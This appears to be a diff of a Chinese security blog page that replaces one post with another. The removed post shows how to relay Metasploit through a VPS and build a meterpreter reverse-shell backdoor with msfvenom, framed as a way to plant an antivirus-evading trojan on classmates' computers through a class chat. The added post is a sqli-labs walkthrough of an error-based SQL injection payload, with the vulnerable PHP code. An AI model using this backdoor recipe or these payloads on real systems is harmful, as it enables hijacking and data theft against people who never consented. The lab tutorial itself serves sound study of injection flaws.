@@ -6,26 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="www.xnianq.cn">
-  <title>内网msf连接外网机器 | xnianq&#39;blog</title>
+  <title>手动利用无回显报错注入 | xnianq&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：  本机有独立ip。但是这个方法很容易被查水表的。 VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡， 通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）">
-<meta name="keywords" content="pentest">
+  <meta name="description" content="手动利用无回显报错注入今天在刷sqli-labs过程中，发现一个比较有趣的东西，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&amp;lt;?php//including the Mysql connect parameters.i">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网msf连接外网机器">
-<meta property="og:url" content="www.xnianq.cn/2016/10/29/内网msf连接外网机器/index.html">
+<meta property="og:title" content="手动利用无回显报错注入">
+<meta property="og:url" content="www.xnianq.cn/2017/11/08/手动利用无回显报错注入/index.html">
 <meta property="og:site_name" content="xnianq&#39;blog">
-<meta property="og:description" content="前言一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：  本机有独立ip。但是这个方法很容易被查水表的。 VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡， 通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/d.png">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/armitage1.jpg">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/link1.jpg">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/msfvenom1.jpg">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/exe.png">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/attack.jpg">
-<meta property="og:updated_time" content="2017-07-27T07:59:12.000Z">
+<meta property="og:description" content="手动利用无回显报错注入今天在刷sqli-labs过程中，发现一个比较有趣的东西，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&amp;lt;?php//including the Mysql connect parameters.i">
+<meta property="og:image" content="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/xiaoguo.png">
+<meta property="og:image" content="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/linkstr.png">
+<meta property="og:image" content="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/rand.png">
+<meta property="og:image" content="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/concat-floor.png">
+<meta property="og:image" content="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/groupby.png">
+<meta property="og:image" content="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/count.png">
+<meta property="og:updated_time" content="2017-11-08T03:00:43.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网msf连接外网机器">
-<meta name="twitter:description" content="前言一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：  本机有独立ip。但是这个方法很容易被查水表的。 VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡， 通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）">
-<meta name="twitter:image" content="http://ofutja06x.bkt.clouddn.com/d.png">
+<meta name="twitter:title" content="手动利用无回显报错注入">
+<meta name="twitter:description" content="手动利用无回显报错注入今天在刷sqli-labs过程中，发现一个比较有趣的东西，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&amp;lt;?php//including the Mysql connect parameters.i">
+<meta name="twitter:image" content="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/xiaoguo.png">
   
     <link rel="alternative" href="/atom.xml" title="xnianq&#39;blog" type="application/atom+xml">
   
@@ -161,48 +160,38 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="title-内网msf连接外网机器" class="article article-type-title " itemscope itemprop="blogPost">
+            <article id="title-手动利用无回显报错注入" class="article article-type-title " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      内网msf连接外网机器
+      手动利用无回显报错注入
     </h1>
   
 
         
-        <a href="/2016/10/29/内网msf连接外网机器/" class="archive-article-date">
-  	<time datetime="2016-10-29T14:01:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-10-29</time>
+        <a href="/2017/11/08/手动利用无回显报错注入/" class="archive-article-date">
+  	<time datetime="2017-11-08T02:30:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：</p>
-<ul>
-<li>本机有独立ip。但是这个方法很容易被查水表的。</li>
-<li>VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡，</li>
-<li>通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）<a id="more"></a>
-</li>
-</ul>
-<p><strong>测试工具</strong>：</p>
-<ul>
-<li>lcx 端口转发工具</li>
-<li>msf，msfvenom，armitage  –metasploit攻击工具</li>
-<li>VPS  公网环境下用于lcx端口转发</li>
-<li>被攻击机器</li>
-</ul>
-<h1 id="0x01-在VPS上面进行端口转发"><a href="#0x01-在VPS上面进行端口转发" class="headerlink" title="0x01 在VPS上面进行端口转发"></a>0x01 在VPS上面进行端口转发</h1><blockquote>
-<p>在一般渗透过程中，由于内网远程连接限制，相信大家都用过lcx进行端口转发。这里也是同理。</p>
-</blockquote>
-<p>端口转发有好多方式，我这里用了最简单的一种了。：）<br>大概思路很很简单，大概思路就是：<br><strong>在vps上面进行端口转发(我在这里用的是lcx的linux版本，portmap)<br><img src="http://ofutja06x.bkt.clouddn.com/d.png" alt="forward"><br><code>./portmap -m 2 -p1 6666 -p2 8888</code><br>这里的意思就是将访问8888端口数据转发到6666端口。那么就可以让后门访问VPS的8888端口，然后本地连接VPS的6666端口，然后达到连接的目的。</strong></p>
-<h1 id="0x02-本地连接vps6666端口"><a href="#0x02-本地连接vps6666端口" class="headerlink" title="0x02 本地连接vps6666端口"></a>0x02 本地连接vps6666端口</h1><p>这里用metasploit图形化界面工具，armitage(kali里面已经集成)。直接打开，然后默认选项进去就行。下一步就是连接VPS了，选择：<strong>armitage-&gt;listeners-&gt;bind</strong><br><img src="http://ofutja06x.bkt.clouddn.com/armitage1.jpg" alt="armitage"><br>在这里，HOST写你的VPS的IP，PORT写6666,shell类型选择meterpreter，可以看到，已经连接上去。<br><img src="http://ofutja06x.bkt.clouddn.com/link1.jpg" alt="link"></p>
-<h1 id="0x03-生成后门，靶机测试。"><a href="#0x03-生成后门，靶机测试。" class="headerlink" title="0x03 生成后门，靶机测试。"></a>0x03 生成后门，靶机测试。</h1><p>免杀用Veil，这里就不用了，简单测试一下，就用msfvenom。命令如下：<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=8888 -f exe &gt; /home/xnianq/test.exe</code><br><img src="http://ofutja06x.bkt.clouddn.com/msfvenom1.jpg" alt="msf"><br>这样已经生成了一个后门，LPORT就是8888端口。<br><img src="http://ofutja06x.bkt.clouddn.com/exe.png" alt="exe"><br>下面就是让被攻击者打开后门，然后得到他的系统权限。<br><img src="http://ofutja06x.bkt.clouddn.com/attack.jpg" alt="attack"><br>这已经拿到了他的系统权限，so，你就可以为所欲为了～ ：）<br>大牛尽情喷～欢迎找我喷～<br>QQ：85903963<br><strong><em>转载请注明出处。</em></strong></p>
+        <h1 id="手动利用无回显报错注入"><a href="#手动利用无回显报错注入" class="headerlink" title="手动利用无回显报错注入"></a>手动利用无回显报错注入</h1><p>今天在刷sqli-labs过程中，发现一个比较有趣的东西，代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//including the Mysql connect parameters.</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">// take the variables</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</div><div class="line">&#123;</div><div class="line">    $uname=$_POST[<span class="string">'uname'</span>];</div><div class="line">    $passwd=$_POST[<span class="string">'passwd'</span>];</div><div class="line"></div><div class="line">    <span class="comment">//logging the connection parameters to a file for analysis.</span></div><div class="line">    $fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</div><div class="line">    fwrite($fp,<span class="string">'User Name:'</span>.$uname.<span class="string">"\n"</span>);</div><div class="line">    fwrite($fp,<span class="string">'Password:'</span>.$passwd.<span class="string">"\n"</span>);</div><div class="line">    fclose($fp);</div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">// connectivity </span></div><div class="line">    @$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</div><div class="line">    $result=mysql_query($sql);</div><div class="line">    $row = mysql_fetch_array($result);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($row)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';   </span></div><div class="line">        </div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</div><div class="line">        <span class="comment">//echo " You Have successfully logged in " ;</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>; </div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        <span class="comment">//echo 'Your Login name:'. $row['username'];</span></div><div class="line">        <span class="comment">//echo "&lt;br&gt;";</span></div><div class="line">        <span class="comment">//echo 'Your Password:' .$row['password'];</span></div><div class="line">        <span class="comment">//echo "&lt;br&gt;";</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;  </div><div class="line">        </div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>  </div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</div><div class="line">        <span class="comment">//echo "Try again looser";</span></div><div class="line">        print_r(mysql_error());</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;  </div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>在注入过程中它会报错，但是如果查询语句是正常的话，并不会回显，但是如果使用盲注，过程太繁琐，所以就产生了这么一种注入技巧吧。<br>整体payload大概是下面这样子:<br><figure class="highlight q"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aaa') <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>))a <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> a)b#</div></pre></td></tr></table></figure></p>
+<p>效果是这样子的:<br><img src="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/xiaoguo.png" alt=""><br>讲真，我看到这么一大串sql语句我也很懵逼哇。我们一点一点分析一下过程吧，借鉴习科上面大牛的解释。</p>
+<h2 id="mysql中几个函数以及特性"><a href="#mysql中几个函数以及特性" class="headerlink" title="mysql中几个函数以及特性"></a>mysql中几个函数以及特性</h2><ol>
+<li>concat函数，作用是连接字符串<br><img src="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/linkstr.png" alt=""></li>
+<li>rand()函数：随机数生成;floor()函数:取整<br>效果大概是这样的，会产生0，1两种情况<br><img src="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/rand.png" alt=""><br>所以第一张效果图中表名前面有一个1就是这个原因～<br><img src="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/concat-floor.png" alt=""></li>
+<li>group by 函数 将这些东西进行分组,去掉一些重复的信息<br><img src="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/groupby.png" alt=""></li>
+<li>count(*)函数，这个函数的作用就是将后面的语句以报错的形式输出。<br><img src="http://xnianq.cn/2017/11/08/手动利用无回显报错注入/count.png" alt=""></li>
+</ol>
+<h2 id="最终sql语句格式"><a href="#最终sql语句格式" class="headerlink" title="最终sql语句格式"></a>最终sql语句格式</h2><p>上面已经说明了下这几个函数的作用，相信也弄懂了上面的一大串sql语句。<br>最终sql注入格式为：<br><figure class="highlight q"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aaa') <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(你的sql查询代码))a <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> a)b#</div></pre></td></tr></table></figure></p>
 <hr>
-<p>本文出自”xnianq Blog”：www.xnianq.cn/2016/10/29/内网msf连接外网机器/</p>
+<p>本文出自”xnianq Blog”：www.xnianq.cn/2017/11/08/手动利用无回显报错注入/</p>
 
       
 
@@ -242,17 +231,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pentest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -303,7 +281,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2016/10/29/内网msf连接外网机器/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2017/11/08/手动利用无回显报错注入/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -317,18 +295,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/12/20/google-hacking/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/11/08/手动利用无回显报错注入/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          google-hacking
+          (no title)
         
       </div>
     </a>
   
   
-    <a href="/2016/09/30/一些拿站的思路/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JBoss的思路</div>
+    <a href="/2017/11/07/sql-injection-with-md5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sql-injection with md5()</div>
       <i class="icon-circle-right"></i>
     </a>
   
